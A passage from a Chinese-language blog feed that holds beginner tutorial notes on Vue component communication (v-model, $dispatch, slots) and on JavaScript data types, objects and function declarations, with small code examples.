title="使用v-model"></a>使用v-model</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;p&gt;总数：&#123;&#123;total&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;mycomponent v-model=&quot;total&quot;&gt;&lt;/mycomponent&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.component(&apos;mycomponent&apos;,&#123;</span><br><span class="line">       template: &apos;&lt;button @click=&quot;hander&quot;&gt;+1&lt;/button&gt;&apos;,</span><br><span class="line">        data: function () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                counter: 0</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">           hander: function () &#123;</span><br><span class="line">               this.counter++;</span><br><span class="line">               this.$emit(&apos;input&apos;,this.counter);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">       el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            total: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h4 id="非父子组件通信"><a href="#非父子组件通信" class="headerlink" title="非父子组件通信"></a>非父子组件通信</h4><blockquote><h5 id="非父子组件通信通常有两种。①兄弟组件。②跨多级组件。"><a href="#非父子组件通信通常有两种。①兄弟组件。②跨多级组件。" class="headerlink" title="非父子组件通信通常有两种。①兄弟组件。②跨多级组件。"></a>非父子组件通信通常有两种。①兄弟组件。②跨多级组件。</h5></blockquote><h5 id="dispatch-此功能已经废弃"><a href="#dispatch-此功能已经废弃" class="headerlink" title="$dispatch() 此功能已经废弃"></a>$dispatch() 此功能已经废弃</h5><blockquote><h6 id="dispatch-用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。"><a href="#dispatch-用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。" class="headerlink" title="$dispatch()用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。"></a>$dispatch()用于向上级派发事件，只要是他的父级都可以在vue实例的event接收。</h6></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">    &lt;mycomponent&gt;&lt;/mycomponent&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Vue.computed(&apos;mycomponent&apos;,&#123;</span><br><span class="line">       template: &apos;&lt;button @click=&quot;sedmess&quot;&gt;传送消息&lt;/button&gt;&apos; ,</span><br><span class="line">        methods: &#123;</span><br><span class="line">           sedmess: function () &#123;</span><br><span class="line">               this.$dispatch(&apos;sed-message&apos;,&quot;来自内部消息&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &apos;&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        event: &#123;</span><br><span class="line">            &apos;sed-message&apos;: function (msg) &#123;</span><br><span class="line">                this.message = msg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="使用slot发布内容"><a href="#使用slot发布内容" class="headerlink" title="使用slot发布内容"></a>使用slot发布内容</h3><h4 id="什么是slot"><a href="#什么是slot" class="headerlink" title="什么是slot"></a>什么是slot</h4><blockquote><h5 id="当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。"><a href="#当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。" class="headerlink" title="当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。"></a>当我们多个组件需要组合使用，混合父组件的内容与子组件的模板时，就会用到slot，这个过程叫做内容分发。</h5></blockquote><ul><li><p><strong><app>组件不知道他的挂载点会有什么东西，挂载点的内容由<app>父组件决定。</app></app></strong></p></li><li><p><strong><app>组件很有可能有他自己的模板。</app></strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptの数据类型</title>
      <link href="/2019/06/06/javascript-shu-ju-lei-xing/"/>
      <url>/2019/06/06/javascript-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScriptの数据类型"><a href="#JavaScriptの数据类型" class="headerlink" title="JavaScriptの数据类型"></a>JavaScriptの数据类型</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>数值(number)：整数和小数</strong></li><li><strong>字符串(string):文本</strong></li><li><strong>布尔值(boolean)：真假</strong></li><li><strong>undefined：表示未定义或者不存在</strong></li><li><strong>null：表示空值</strong></li><li><strong>对象(object)：各种值组成的集合</strong></li></ul><p><strong>利用typeof可以返回数据类型</strong></p><h2 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined"></a>null和undefined</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><h4 id="null与undefined都可以表示“没有”，含义非常相似。"><a href="#null与undefined都可以表示“没有”，含义非常相似。" class="headerlink" title="null与undefined都可以表示“没有”，含义非常相似。"></a>null与undefined都可以表示“没有”，含义非常相似。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="literal">undefined</span>;</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></div><p><strong>区别：null是表示一个空对象，转为数值时为0；undefined是表示此处未定义的原始值，转为数值时为NaN。</strong></p><h2 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h2><blockquote><p>布尔值代表真和假两个状态。</p></blockquote><p>下列运算符会返回布尔值：</p><ul><li><strong>前置逻辑运算符：!</strong></li><li><strong>相等运算符：===，！==，==，！=</strong></li><li><strong>比较运算符：&gt;,&gt;=,&lt;,&lt;=</strong></li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><blockquote><h4 id="字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。"><a href="#字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。" class="headerlink" title="字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。"></a>字符串就是零个或者多个字符组成的，放在单引号或者双引号之中。</h4></blockquote><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><blockquote><h5 id="反斜杠-在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。"><a href="#反斜杠-在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。" class="headerlink" title="反斜杠()在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。"></a>反斜杠()在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义字符。</h5></blockquote><ul><li><strong>\0 : null(\u000)</strong></li><li><strong>\b : 后退键(\u0008)</strong></li><li><strong>\f : 换页符(\u000C)</strong></li><li><strong>\n : 换行符(\u000A)</strong></li><li><strong>\r : 回车键(\u000D)</strong></li><li><strong>\t : 制表符(\u0009)</strong></li><li><strong>\v : 垂直制表符(\u000B)</strong></li><li><strong>\‘  : 单引号(\u0027)</strong></li><li><strong>\“ : 双引号(\u0022)</strong></li><li><strong>\\ : 反斜杠(\u005C)</strong></li></ul><h4 id="字符串与数组"><a href="#字符串与数组" class="headerlink" title="字符串与数组"></a>字符串与数组</h4><blockquote><p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> s = <span class="string">'hello'</span>;</span><br><span class="line">&gt; s[<span class="number">0</span>]</span><br><span class="line"><span class="string">'h'</span></span><br><span class="line">&gt; s[<span class="number">1</span>]</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line">&gt; s[<span class="number">2</span>]</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line">&gt; s[<span class="number">3</span>]</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line">&gt; s[<span class="number">4</span>]</span><br><span class="line"><span class="string">'o'</span></span><br><span class="line">&gt; s[<span class="number">5</span>]</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'hello'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> s[<span class="number">0</span>];</span><br><span class="line">s <span class="comment">// "hello"</span></span><br><span class="line"></span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'a'</span>;</span><br><span class="line">s <span class="comment">// "hello"</span></span><br><span class="line"></span><br><span class="line">s[<span class="number">5</span>] = <span class="string">'!'</span>;</span><br><span class="line">s <span class="comment">// "hello"</span></span><br></pre></td></tr></table></figure></div><p><strong>上述代码表示,字符串内部的的那个字符无法改变和增删，这些操作会默默地失败。</strong></p><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'hello'</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">s.length = <span class="number">3</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">s.length = <span class="number">7</span>;</span><br><span class="line">s.length <span class="comment">// 5</span></span><br></pre></td></tr></table></figure></div><p><strong>length属性返回字符串的长度，该属性是不可以修改的。</strong></p><h4 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h4><p><strong>JavaScript使用Unicode字符集</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'\u00A9'</span>;</span><br><span class="line">s <span class="comment">// "©"</span></span><br></pre></td></tr></table></figure></div><h4 id="Base64转码"><a href="#Base64转码" class="headerlink" title="Base64转码"></a>Base64转码</h4><p><strong>有时候文本里面包含一些不可打印的符号，比如ASCII码0到31的符号都打印不出来，这时候可以使用Base64编码。另一个场景是，有时候需要以文本格式传递二进制数据，那么也可以使用Base64编码。</strong></p><ul><li><strong>btoa():任意值转为Base64编码。</strong></li><li><strong>atob()：Base编码转为原来的值。</strong></li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> string = <span class="string">'Hello World!'</span>;</span><br><span class="line">btoa(string) <span class="comment">// "SGVsbG8gV29ybGQh"</span></span><br><span class="line">atob(<span class="string">'SGVsbG8gV29ybGQh'</span>) <span class="comment">// "Hello World!"</span></span><br></pre></td></tr></table></figure></div><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><h4 id="生成方法"><a href="#生成方法" class="headerlink" title="生成方法"></a>生成方法</h4><blockquote><h5 id="对象-object-就是一组“键值对”-key-value-的集合，是一种无序的复合数据集合。"><a href="#对象-object-就是一组“键值对”-key-value-的集合，是一种无序的复合数据集合。" class="headerlink" title="对象(object)就是一组“键值对”(key-value)的集合，是一种无序的复合数据集合。"></a>对象(object)就是一组“键值对”(key-value)的集合，是一种无序的复合数据集合。</h5></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  foo: <span class="string">'Hello'</span>,</span><br><span class="line">  bar: <span class="string">'World'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h4 id="键名"><a href="#键名" class="headerlink" title="键名"></a>键名</h4><blockquote><p>对象的所有键名都是字符串，所有加不加引号都可以。</p></blockquote><h4 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用"></a>对象的引用</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var v1 = &#123;&#125;;</span><br><span class="line">var v2 = v1;</span><br><span class="line">v1.a = 1;</span><br><span class="line">v2.a</span><br><span class="line">// 1</span><br></pre></td></tr></table></figure></div><h3 id="属性的操作"><a href="#属性的操作" class="headerlink" title="属性的操作"></a>属性的操作</h3><h4 id="属性的读取"><a href="#属性的读取" class="headerlink" title="属性的读取"></a>属性的读取</h4><p><strong>读取对象的属性，有两种方法，一种的使用点运算符，还有一种是使用方括号运算符。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  p: <span class="string">'Hello World'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.p <span class="comment">// "Hello World"</span></span><br><span class="line">obj[<span class="string">'p'</span>] <span class="comment">// "Hello World"</span></span><br></pre></td></tr></table></figure></div><h4 id="属性赋值"><a href="#属性赋值" class="headerlink" title="属性赋值"></a>属性赋值</h4><p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo = <span class="string">'Hello'</span>;</span><br><span class="line">obj[<span class="string">'bar'</span>] = <span class="string">'World'</span>;</span><br></pre></td></tr></table></figure></div><h4 id="属性的查看"><a href="#属性的查看" class="headerlink" title="属性的查看"></a>属性的查看</h4><p><strong>查看一个对象本身的所有属性，可以使用Object.keys方法。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  key1: <span class="number">1</span>,</span><br><span class="line">  key2: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj);</span><br><span class="line"><span class="comment">// ['key1', 'key2']</span></span><br></pre></td></tr></table></figure></div><h4 id="属性的删除：delete命令"><a href="#属性的删除：delete命令" class="headerlink" title="属性的删除：delete命令"></a>属性的删除：delete命令</h4><p><strong>delete命令用于删除对象的属性，删除成功后返回true。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> obj = &#123;<span class="attr">p</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">[ <span class="string">'p'</span> ]</span><br><span class="line">&gt; <span class="keyword">delete</span> obj.p</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; obj.p</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure></div><h4 id="属性是否存在：in运算符"><a href="#属性是否存在：in运算符" class="headerlink" title="属性是否存在：in运算符"></a>属性是否存在：in运算符</h4><p><strong>in运算符用于检查对象是否包含某个属性（检查的是键名，不是键值），如果包含则返回true。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> obj = &#123;<span class="attr">p</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="string">'p'</span> <span class="keyword">in</span> obj</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; <span class="string">'toString'</span> <span class="keyword">in</span> obj</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure></div><p><strong>你会发现对象并无toString属性，但是返回的却是true。说明这个属性是继承的。</strong></p><p><strong>这是我们可以使用hasOwnProperty方法判断，是否对象是否是自身属性。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span> (<span class="string">'toString'</span> <span class="keyword">in</span> obj) &#123; <span class="built_in">console</span>.log(obj.hasOwnProperty(<span class="string">'toString'</span>))&#125;</span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure></div><h4 id="属性的遍历：for…in循环"><a href="#属性的遍历：for…in循环" class="headerlink" title="属性的遍历：for…in循环"></a>属性的遍历：for…in循环</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'键名：'</span>, i);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'键值：'</span>, obj[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 键名： a</span></span><br><span class="line"><span class="comment">// 键值： 1</span></span><br><span class="line"><span class="comment">// 键名： b</span></span><br><span class="line"><span class="comment">// 键值： 2</span></span><br><span class="line"><span class="comment">// 键名： c</span></span><br><span class="line"><span class="comment">// 键值： 3</span></span><br></pre></td></tr></table></figure></div><ul><li><strong>它遍历的是对象所有可遍历的属性，会跳过不可遍历的属性。</strong></li><li><strong>它不仅遍历对象自身的属性，还好遍历继承的属性。</strong></li></ul><h4 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span>(对象) &#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><h4 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h4><blockquote><h5 id="JavaScript有三种声明函数的方法。"><a href="#JavaScript有三种声明函数的方法。" class="headerlink" title="JavaScript有三种声明函数的方法。"></a>JavaScript有三种声明函数的方法。</h5></blockquote><p><strong>(1)function命名</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名称(<span class="params">参数</span>) </span>&#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>(2)函数表达式(变量赋值)</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名称 = <span class="function"><span class="keyword">function</span>(<span class="params">参数</span>) </span>&#123;</span><br><span class="line">    代码块</span><br><span class="line">&#125;;</span><br><span class="line">执行时</span><br><span class="line">变量名称()</span><br></pre></td></tr></table></figure></div><p><strong>这种方法将一个匿名函数赋值给变量，这是，这个匿名函数又称之为函数表达式。</strong>    </p><p><strong>(3)Function构造函数</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add = <span class="keyword">new</span> <span class="built_in">Function</span>(</span><br><span class="line"><span class="string">'x'</span>,</span><br><span class="line">    <span class="string">'y'</span>,</span><br><span class="line">    <span class="string">'return x+y'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="函数的重复声明"><a href="#函数的重复声明" class="headerlink" title="函数的重复声明"></a>函数的重复声明</h4><p><strong>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</strong></p><h4 id="圆括号运算符，return语句和递归"><a href="#圆括号运算符，return语句和递归" class="headerlink" title="圆括号运算符，return语句和递归"></a>圆括号运算符，return语句和递归</h4><p><strong>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。</strong></p><h4 id="第一等公民"><a href="#第一等公民" class="headerlink" title="第一等公民"></a>第一等公民</h4><blockquote><p>由于函数与其他数据类型的地位平等，所以在JavaScript中称函数为第一公民。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将函数赋值给一个变量</span></span><br><span class="line"><span class="keyword">var</span> operator = add;</span><br></pre></td></tr></table></figure></div><h4 id="函数名的提升"><a href="#函数名的提升" class="headerlink" title="函数名的提升"></a>函数名的提升</h4><p><strong>JavaScript引擎将函数名视同变量名，所以采用function命令声明函数时，整个函数将会像变量声明一样，被提升到代码头部。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test()</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">不报错</span><br></pre></td></tr></table></figure></div><p><strong>若采用其他的声明方式，下面则会报错。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test()</span><br><span class="line"><span 